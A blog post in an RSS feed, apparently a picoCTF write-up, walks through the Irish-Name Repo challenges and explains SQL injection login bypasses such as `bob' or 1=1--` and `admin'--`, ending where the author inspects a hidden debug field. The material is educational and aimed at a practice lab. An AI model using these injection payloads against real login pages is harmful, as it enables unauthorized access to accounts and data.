<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[hatecomputers.club]]></title><description><![CDATA[Blog primarily about infosec and some random thoughts.]]></description><link>https://gatsby-starter-blog-demo.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Sun, 17 Jan 2021 14:56:16 GMT</lastBuildDate><item><title><![CDATA[Pico CTF - Irish-Name Repo]]></title><description><![CDATA[Pico CTF has been around for awhile and it seems to be more approachable one amongst other platforms alike. Different from Hackthebox or…]]></description><link>https://gatsby-starter-blog-demo.netlify.app/picoctf-irish-name-repo/</link><guid isPermaLink="false">https://gatsby-starter-blog-demo.netlify.app/picoctf-irish-name-repo/</guid><pubDate>Mon, 04 Jan 2021 22:12:03 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://play.picoctf.org/&quot;&gt;Pico CTF&lt;/a&gt; has been around for awhile and it seems to be more approachable one amongst other platforms alike. Different from Hackthebox or Tryhackme (where “pwn a box” usually means chaining security vulnerabilities altogether towards finding the flags), on every picoCTF challenge, you just get an URL where there’s a small puzzle to be solved. Most of the time it involves one specific type/class of security flaw - like &lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-site_scripting&quot;&gt;XSS&lt;/a&gt; or &lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot;&gt;SQLi&lt;/a&gt; for instance - and that’s about it. Also, you don’t really need VPN’s or any additional setup other than creating an account. Simple and easy.&lt;/p&gt;
&lt;h2&gt;Irish-Name Repo challenges&lt;/h2&gt;
&lt;p&gt;I was basically skimming through the &lt;a href=&quot;https://play.picoctf.org/practice?category=1&amp;#x26;page=1&quot;&gt;Web Exploitation&lt;/a&gt; category when I came across &lt;strong&gt;Irish-Name Repo&lt;/strong&gt;. The nice thing about this pick is that it is a composed challenge, each one slightly more difficult than the previous. It was apparently part of the picoCTF 2019, so not that old either. Lets get to it.&lt;/p&gt;
&lt;h3&gt;Irish-Name Repo 1&lt;/h3&gt;
&lt;p&gt;So right after selecting the first challenge, it displayed a modal with the URL and a small description of what needed to be achieved:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c8f44ac6f95c3dcdf4780873c6d5661f/c4451/irish-name-1.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 74.0506329113924%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAACYUlEQVQ4y41TW27UQBD0/ZDCCZDgiwsgfpH45hIghJKABBI/PE7AK4D4iNhsnJDEzq7HnvHb42dRPbtBCSSApVL3PLrdVd3jWduiqmqUTYOqbVHUDUpr0Y0DsrJEnpcYhhHjOP6yl0LOhgFeyaAgWOB0/wdOZz6C2QGOv/uwKsXyKISKNaZpwn994wQvzWpkqUb/+i3GJ88wbr/E9PwN+s1XwKddd29iBZL0PFw8E4y/7XsmtWhJtSHVuqrQ0R/6juhJUTD8QU/2W1sxZc8kXJ8784qiRBguEYQLRCr5K6Ozymw7YHeWIFzyx+PFO540xKQZsrxw1jWorFCxYgk/j3EtZRSPuPfA4s79Bifh6E6lYY6ybSwaVtlKIpPTZ7I0R50V4C2yIrp+hbZztqcci0WMxdIgTgwSbZAypuW513FEmqpnYyoYOYx5aDKoKEG0jKHdnkasZK2oc71KSD9SsbOnC4WYd1zCmtTStIBmEqGsdUqbU4LSrcV3+/ITBklXRXzRuyCbab3u+1XzvFT0y9bIc2dlL6cv1pgUMqtnqDgJAiuTwcdg7WpKuq5zvncShJjvHxA+/IND+P4hZnv72Jv7tHPMZnNEkUKSJKQVE4osjKMrbALGy5dRc601vDhO1lWlV8IYcwF5nrGxDWe1pKbazaOsyyJfaSgQCvKuz8q/DCJ6z6Ev2cSPXzu8/9xh51uPdzstPnzpUDd8y3JJEoqoXd87+6/vKJiwccti42aD23dbXKd/7UYDNhueYrdEE2l7kmhnr4J02RiNo2ODx08VHm4qbL1QeLRFbCucBAY/AftIeJ87l6OEAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;First challenge&quot;
        title=&quot;First challenge&quot;
        src=&quot;/static/c8f44ac6f95c3dcdf4780873c6d5661f/f058b/irish-name-1.png&quot;
        srcset=&quot;/static/c8f44ac6f95c3dcdf4780873c6d5661f/c26ae/irish-name-1.png 158w,
/static/c8f44ac6f95c3dcdf4780873c6d5661f/6bdcf/irish-name-1.png 315w,
/static/c8f44ac6f95c3dcdf4780873c6d5661f/f058b/irish-name-1.png 630w,
/static/c8f44ac6f95c3dcdf4780873c6d5661f/40601/irish-name-1.png 945w,
/static/c8f44ac6f95c3dcdf4780873c6d5661f/78612/irish-name-1.png 1260w,
/static/c8f44ac6f95c3dcdf4780873c6d5661f/c4451/irish-name-1.png 1450w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Goal&lt;/strong&gt;: Bypass a login page &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Clicking on the link tool me to a page listing some people (presumably Irish). I could see their pics, along with their names and a short description. On the left, there was a menu (you have to click on the hamburger icon) that as soon as it was displayed, presented me with three options:  &lt;strong&gt;Close Menu&lt;/strong&gt;, &lt;strong&gt;Support&lt;/strong&gt; and &lt;strong&gt;Admin Login&lt;/strong&gt;. There was also a pagination at the very bottom but that didn’t really work. Pressing CTRL+U and quickly checking the source code gave me nothing other than a pretty standard page html page.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/215534e1d005e8686ca4297bfb9edb86/7ad71/irish2.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 61.39240506329114%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAADPElEQVQoz22T/1PTdRzHP39DUT/VH1D6Uwkh2TeBS9CwHSyBgACxCCUGGuiQjUmgFMqaDnTIlwD56qSdAqsBegwYDgk9x5EgcfK1Gt9sA7YxePRhP1XX8+51z3s+X3fP173f93oJDoeDHWxtbflqe3ub/8LpdLK0tMTK8vL/9v8JYSfE6/X+y3S5Xbg9bp/vcm2wtr4uao9Pe72bbG56cbs9eDw77BV5UyyPj4VVceqzyafYHo9xpew6Dc16bhrb6LcOEBS4B8nBUM5kHENTkE1LfRld99ppaNKTkVXEmdNFKBWFyBUlZJ8t5bRCjfB8eRHjbT3xSV+wJyiYqOhoOjqNbDjdSCIPEbFvL9roKEyqTAY7aujp7UB7tYrDkhRyvkzl1jU1hSdlJB49RUxyDsKKfZ6qy0UkS8KJDXmbRDGkubkOz9YirS21HAnay4UD4dwvzMVu62X40SBa3Q9IIo5QrZTxh8lAR3EeqUdPEJWYjTA5NoLhhpbrOccojg2hJu8E7aK+Z23jXHEBae+8R5k0mpEiBfbhu/Q9HOJ8iRbpocPoshKZ1N+gq7SQppJCMmVKhCc2Kzp1PhfTEyhPj+MnjZInD810m7v5JD6SA/4BfBXyPubvlSz82k/PfTPlVytJCAulQp6Ktew78uM/JjMpie66agSr2cg1jYrLeTLOx4bRqExjfHyMmdkFaktVZKRI0eTKmBvqYuZBFzbLHWxGPXfFbzqbJCUt8iNi/HehOZ6MUXy60NZaS/rxBMJC95MV8S6Z0g+Ji4+jf8BCe1U9fbeq0VeqGW6qo+/SBSYe9zLdd4eF9kZyP4sh//NPKZd/zbihjqn+HoR8lQK/l1/kBT8/UsL380HAG7z0yqvITp6is74Vc0sLP9dfwlRXgUlXwdToCDVX1Ey1VtKgkvPma7vR5MmZfjDA3O+LCOe+KeD13bvwD3yLgAB/kQPZFxxMrlKF6aaBiV9G6LvdgPlHHWODFv58NkXJt2oMmouMd7YRG36QocZK5qZnWV11iGuzssLc/Dyjo6NYLBZsIs/MzmK323E+/4v1tTV+ezqB7dEwq8tLuDc2cLtceMULczodorfIToYP4ln+DcYNyiPV1HdIAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;irish2&quot;
        title=&quot;irish2&quot;
        src=&quot;/static/215534e1d005e8686ca4297bfb9edb86/f058b/irish2.png&quot;
        srcset=&quot;/static/215534e1d005e8686ca4297bfb9edb86/c26ae/irish2.png 158w,
/static/215534e1d005e8686ca4297bfb9edb86/6bdcf/irish2.png 315w,
/static/215534e1d005e8686ca4297bfb9edb86/f058b/irish2.png 630w,
/static/215534e1d005e8686ca4297bfb9edb86/40601/irish2.png 945w,
/static/215534e1d005e8686ca4297bfb9edb86/78612/irish2.png 1260w,
/static/215534e1d005e8686ca4297bfb9edb86/7ad71/irish2.png 2338w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt; The &lt;a href=&quot;https://play.picoctf.org/practice/challenge/80?category=1&amp;#x26;page=1&quot;&gt;first link&lt;/a&gt; on the menu did exactly what it said it would: It closed the menu. The second item got me to a forum sort of page where there was a discussion about irish people. First comment was a giveaway:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“Hi. I tried adding my favorite Irish person, Conan O’Brien. But I keep getting something called a &lt;strong&gt;SQL Error&lt;/strong&gt;.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After that, the obvious place to go was the admin login. The login was pretty standard and the first thing I did was to add a single quote &lt;code class=&quot;language-text&quot;&gt;&amp;#39;&lt;/code&gt; to both &lt;strong&gt;Username&lt;/strong&gt; and &lt;strong&gt;Password&lt;/strong&gt; fields, expecting the application to throw me a SQL error. Instead, I got a &lt;strong&gt;“Login failed”&lt;/strong&gt; response. Small tweak, this time adding &lt;code class=&quot;language-text&quot;&gt;bob&amp;#39;&lt;/code&gt; in the username field and which threw me a &lt;strong&gt;500 Internal Server Error&lt;/strong&gt;. That was the indication this actually broke the SQL query.&lt;/p&gt;
&lt;p&gt;After that, I went for the obvious &lt;code class=&quot;language-text&quot;&gt;bob&amp;#39; or 1=1--&lt;/code&gt; on the &lt;strong&gt;Username&lt;/strong&gt;. This got me logged in and along with that, the first flag.&lt;/p&gt;
&lt;h4&gt;Explanation&lt;/h4&gt;
&lt;p&gt;This might be the most basic &lt;em&gt;SQL injection&lt;/em&gt; technique - and most well known - to bypass login pages. It has been around for quite some time and consists in two things: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The fact that the input &lt;strong&gt;isn’t sanitized&lt;/strong&gt; and injects whatever you passed in directly into the query;&lt;/li&gt;
&lt;li&gt;The fact that by manipulating the query, it allows you to disregard the first piece of the condition by creating a second onee that &lt;strong&gt;always evaluate to true&lt;/strong&gt;;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The standard query to retrieve and validate wether an user actually exists could be something like this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;SELECT FROM users WHERE username=&amp;#39;bob&amp;#39; AND password=&amp;#39;p4ssw0rd&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Getting a response from this query means the user sent by whoever is trying to log in actually exists. So now, take a moment to double-check what we just did when the &lt;code class=&quot;language-text&quot;&gt;bob&amp;#39; or 1=1--&lt;/code&gt; was introduced as a username. I will rewrite the &lt;em&gt;SQL&lt;/em&gt; so you can see for yourself:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;SELECT FROM users WHERE username=&amp;#39;bob&amp;#39; or 1=1--&amp;#39; AND password=&amp;#39;p4ssw0rd&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And now to sum it up:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We first introduce a &lt;code class=&quot;language-text&quot;&gt;&amp;#39;&lt;/code&gt;, which in the context of this query, sets the boundary of that string - &lt;strong&gt;bob&lt;/strong&gt; - informed&lt;/li&gt;
&lt;li&gt;Then, we add our condition &lt;code class=&quot;language-text&quot;&gt;1=1&lt;/code&gt; that happens to always evaluate to &lt;strong&gt;true&lt;/strong&gt;. This for instance, could also be replace by &lt;code class=&quot;language-text&quot;&gt;2 &amp;gt; 1&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;&amp;#39;a&amp;#39;=&amp;#39;a&amp;#39;&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Last but not least: we add a &lt;code class=&quot;language-text&quot;&gt;--&lt;/code&gt; which stands for &lt;strong&gt;comment&lt;/strong&gt; in &lt;em&gt;SQL&lt;/em&gt;, and this tells the interpreter to &lt;strong&gt;ignore&lt;/strong&gt; the remaining pieces of this query &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The outcome is a query that evaluates to true allowing me to login without an actual valid password. Hopefully that made sense.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Irish-Name Repo 2&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://play.picoctf.org/practice/challenge/59?category=1&amp;#x26;page=1&quot;&gt;The second challenge&lt;/a&gt; landed me back to the same page. This time however, the description hinted the SQL had been improved or in other words, my first bypass was now discarded. Lets have a look.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/24838cb23e07f8e564ed8d158bf4d893/e515d/irish-name-2.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.84810126582278%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAABYlAAAWJQFJUiTwAAACYElEQVQ4y41TPY/TQBD1X6Okp0BCor+Klj+B6BBQQIM4CihOSIiCjpKOj1ySI3cc4fLh2Guv7fXG3nUebzaXu5CDEys9zex4/Xbe7EzknIMxNcyygaVfWkt/icZ76KpCUVZYrVaQJfZadB2ikj+NxxPMRqeY9Ec4GxxjfDiCmaeIx1MsEnVBuL12Y7L3jUPUtC2yRYzu4C26l6/RvTrA6s17+P13wKfe+jBv3s1mm2iDTjL0lLakRIGlXMcLPKV7L/ABcnAbErPWoGmbK98iqdFkOsdPylaZxrXrPDH58eRUsb72PMvLI1FdW2S5RkayXJewfByJWWa84diGrLZd4cFjhx/j1fkFl7KjlgSVLlBXBnmaoaRfKI0qLwDfAc7T+rVtXbDyo8q7QLz7QBFYr2XFdtEVtMppy2CFXPGFVUK7UMgZk7jEpIabGuy2VGTtEpNZgtk8wXQW048RL1LM4zTYmASCWZyw1nEoy3U9GdUkTFKFhJlIHYUkYXYps5HaznlRWZor0v7Wh0FyxdoVZYmKDR78oiBByekxISZ78XfRNE2AtNvGb9ly0XQ6Q39whMHwO0bHJxiNToJ/2B+GeL9/hDiOkabMPEkC0qAohab88a8zvjJCd0gsyrIMeU55WYa1n134f+5VsEqpEPOOM97V0PmcQhtiSUUF24avvEn333BbWO+Hxw5f+y16Q4dvgwZfDjnC2pOQBxQfQF7bGBvsZuR24XwXRrKsOty9Z3HzjsHefYvbezVu3DL48NFL29gww3Vd/xespcyixrP9Ag+faDx9UeDRc83J0fjcM/gNfp3K+175kpgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;irish name 2&quot;
        title=&quot;irish name 2&quot;
        src=&quot;/static/24838cb23e07f8e564ed8d158bf4d893/f058b/irish-name-2.png&quot;
        srcset=&quot;/static/24838cb23e07f8e564ed8d158bf4d893/c26ae/irish-name-2.png 158w,
/static/24838cb23e07f8e564ed8d158bf4d893/6bdcf/irish-name-2.png 315w,
/static/24838cb23e07f8e564ed8d158bf4d893/f058b/irish-name-2.png 630w,
/static/24838cb23e07f8e564ed8d158bf4d893/40601/irish-name-2.png 945w,
/static/24838cb23e07f8e564ed8d158bf4d893/78612/irish-name-2.png 1260w,
/static/24838cb23e07f8e564ed8d158bf4d893/e515d/irish-name-2.png 1430w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Goal&lt;/strong&gt;: Bypass the enhanced login page &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I went back to the admin page and tried the same payload I used before &lt;code class=&quot;language-text&quot;&gt;admin&amp;#39; or 1=1--&lt;/code&gt;. What happened this time however, is our SQLi attempt gets detected
right away as shown down below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8ebb470a1d6a09600dc127a16fde0627/38116/sql-detected.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 58.86075949367089%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAAAXUlEQVQoz+3MQQqAIBSE4XdoySxIRULrmnoMdUIXEa0qWzrwbWbxE2McAxcQYq6s3WDdDmNWSKWhtMEiNfg4PULeexQhhKp1dD9SSqcY42t0DRQ55yaEn9eDPfhhB+XTm4fzR/TvAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;sql detected&quot;
        title=&quot;sql detected&quot;
        src=&quot;/static/8ebb470a1d6a09600dc127a16fde0627/f058b/sql-detected.png&quot;
        srcset=&quot;/static/8ebb470a1d6a09600dc127a16fde0627/c26ae/sql-detected.png 158w,
/static/8ebb470a1d6a09600dc127a16fde0627/6bdcf/sql-detected.png 315w,
/static/8ebb470a1d6a09600dc127a16fde0627/f058b/sql-detected.png 630w,
/static/8ebb470a1d6a09600dc127a16fde0627/40601/sql-detected.png 945w,
/static/8ebb470a1d6a09600dc127a16fde0627/78612/sql-detected.png 1260w,
/static/8ebb470a1d6a09600dc127a16fde0627/38116/sql-detected.png 2086w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;After playing with the input for a second, I noticed what was giving away our SQLi attempt was in fact the &lt;code class=&quot;language-text&quot;&gt;or&lt;/code&gt; piece. So everything with &lt;strong&gt;or&lt;/strong&gt; in the condition would trigger the validation. I then, removed the &lt;code class=&quot;language-text&quot;&gt;or 1=1--&lt;/code&gt; altogether and replaced it with just &lt;code class=&quot;language-text&quot;&gt;admin&amp;#39;--&lt;/code&gt;. Boom, got the second flag.&lt;/p&gt;
&lt;h4&gt;Explanation&lt;/h4&gt;
&lt;p&gt;So in this case the validator was only looking for &lt;code class=&quot;language-text&quot;&gt;or&lt;/code&gt; as part of the query, and I needed to find away to accomplish the same result without it. What I did then was take into account the fact that I knew beforehand the &lt;code class=&quot;language-text&quot;&gt;admin&lt;/code&gt; was a valid user - he was posting in the forum page - and that’s all. This is how the query looks like:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;SELECT FROM users WHERE username=&amp;#39;admin&amp;#39;-- AND password=&amp;#39;p4ssw0rd&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This again, returned a response which is enough for me to get new the flag.&lt;/p&gt;
&lt;h3&gt;Irish-Name Repo 3&lt;/h3&gt;
&lt;p&gt;Until now, this had been a walk in a park. Even if you are not familiar with &lt;em&gt;SQLi&lt;/em&gt; techniques, just by looking at payloads out there you would eventually be able to log in. The last piece of this challenge requires a little investigation nonetheless. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b08164cd67142f3dfd2b81c8f24d76c8/c65fa/irish-name-3.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.41772151898735%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAACU0lEQVQ4y31Uy44TMRCcj+PGBywXzsAP8BWcgQsSywEtIDggBOIHuCwHWO0jL6IgtLuZzMvjGc94/Cq6vWQJJGCpZE/HblV1VycxxqCuG8iuh9QaNe1CKejgIZoWVVUjhABevP8XPiBRXYfLyyWy8Qzp8QjpyQQXRyOoxQXyxTmKSlwn3Fy7YhREoocBRZbBvnsPd/Aa7sVb+DcfYQ8+IHw+i/e8c/De/wHOx0n/jifWOvR6gDIWLSV3nGAT8fG2PK0VjBm2SpEoRZKXK5yfX0JQvXatcEXnWqajWp1NKtRSb8lPOmpCXlQoygolJRS1jLvkhgiJgZoWH/0Cr14HPHhs8OPiKuL9BkNPUi0ldSTbqh6m0xgaFWND28FTHFQWyoxA58A7PTQmxERbkr21kEKjKiWKvES2KlAS43SZxXNViohslce9Jea/JW7XNjHEsBJNlMdSM0paiRqrrIAilnzJOR8RNuq40zZcw7ZtIaUkc0s0DRlcNvHMMf7msyKjd+TXNfjbkjJNg9D3VBpyBw8II1kuU8xmc0ymMywW3zGfLzCezDAeTyn2DaPRBGmaIs/ziIw8WxQFVqsMglQtySHkLLTkFv4tqSpqf03dFWInagLfWaMkNwhRwVkVUZZLEspO0MS8oRoSdbYO09bUxU36u2CtoTsWpxOLrycGZ1OPo1ODL8f0nyD9uimSvKVjYp4aR6O2CzxVITjyqMOtex1u3la4c7/D3t0ON/YUPh06JGtGvK/Bxf4XeNzadsD+yxaP9hs8e9XiyfMWD582mM57/ARglH8g0+PZ8QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;irish name 3&quot;
        title=&quot;irish name 3&quot;
        src=&quot;/static/b08164cd67142f3dfd2b81c8f24d76c8/f058b/irish-name-3.png&quot;
        srcset=&quot;/static/b08164cd67142f3dfd2b81c8f24d76c8/c26ae/irish-name-3.png 158w,
/static/b08164cd67142f3dfd2b81c8f24d76c8/6bdcf/irish-name-3.png 315w,
/static/b08164cd67142f3dfd2b81c8f24d76c8/f058b/irish-name-3.png 630w,
/static/b08164cd67142f3dfd2b81c8f24d76c8/40601/irish-name-3.png 945w,
/static/b08164cd67142f3dfd2b81c8f24d76c8/78612/irish-name-3.png 1260w,
/static/b08164cd67142f3dfd2b81c8f24d76c8/c65fa/irish-name-3.png 1434w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Goal&lt;/strong&gt;: Bypass the latest login page which now only displays the &lt;strong&gt;password&lt;/strong&gt; input field. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bebbd4feb7602165b69ad1035bd4a71b/2d912/only-password.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 59.49367088607595%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAABEklEQVQoz82QTU/CQBCG+z8VBQ3R8mFdWk38L5AYEv+EJ88lHDgq1dgLSjQiggl0P15ntlmCcqmGg2/ybGYnM+/srNdonkKICEHzBC0hcBaGOI9CRC0BEQSo+z4a9ZrlqFrFQbmMw0plg1JpHzu7e/BAWmQK6esnHl/mGD594HY0xR1D8XCN5HmGZDzf4J5YKsNWuWFKRlG3h4urPkS3j+N2jFqnB78Tf6f9A8rltTEexjNnaLCUCtP3N2KCjGKlFGRBuDaT0vaxl32hVBqDdGJXZhmtYYwpBB3QVM8eq5X5cnmT4HowssmF5Km6GNTLG2bOMB+SfyhLa5pofo/z8FywnvyruN9zwTZY/eE29f8NvwDNt31cWia6YgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;only password&quot;
        title=&quot;only password&quot;
        src=&quot;/static/bebbd4feb7602165b69ad1035bd4a71b/f058b/only-password.png&quot;
        srcset=&quot;/static/bebbd4feb7602165b69ad1035bd4a71b/c26ae/only-password.png 158w,
/static/bebbd4feb7602165b69ad1035bd4a71b/6bdcf/only-password.png 315w,
/static/bebbd4feb7602165b69ad1035bd4a71b/f058b/only-password.png 630w,
/static/bebbd4feb7602165b69ad1035bd4a71b/40601/only-password.png 945w,
/static/bebbd4feb7602165b69ad1035bd4a71b/78612/only-password.png 1260w,
/static/bebbd4feb7602165b69ad1035bd4a71b/2d912/only-password.png 1772w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I once again, found myself staring at the admin page just to find out this time, there was only a password field being displayed. Since I didn’t know any passwords and there was no way to know them just like I did with usernames, I stopped to understand my options for a second. Just out of curiosity, I decided to throw &lt;code class=&quot;language-text&quot;&gt;admin&amp;#39;--&lt;/code&gt; just to get that out of the day and that obviously didn’t work. I then, pressed &lt;code class=&quot;language-text&quot;&gt;CTRL+U&lt;/code&gt; to see the page’s source code. Carefully checking the form to submit the request, I noticed a hidden field called &lt;strong&gt;debug&lt;/strong&gt;. Now with the developer tools, I changed its value from &lt;strong&gt;0&lt;/strong&gt; to &lt;strong&gt;1&lt;/strong&gt;, password to &lt;strong&gt;abc&lt;/strong&gt; and again, submitted the request.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bbe542a7cfcd190161dc9ca13f344064/d9ed5/chrome-dev-tools.png&quot;
    style=&quot;display: block&quot;
